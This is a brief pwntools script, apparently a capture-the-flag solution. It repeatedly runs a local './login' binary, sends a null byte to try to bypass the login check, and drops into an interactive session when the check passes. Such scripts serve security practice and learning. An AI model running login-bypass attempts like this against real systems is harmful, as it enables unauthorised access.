from pwn import *
from LibcSearcher import *
for i in range(1000):
    p=process('./login')
    print(p.recv())

    p.sendline(b'\x00')
    re=p.recv()
    if(not b'Wrong' in re):
        print(re)
        p.interactive()
        pause()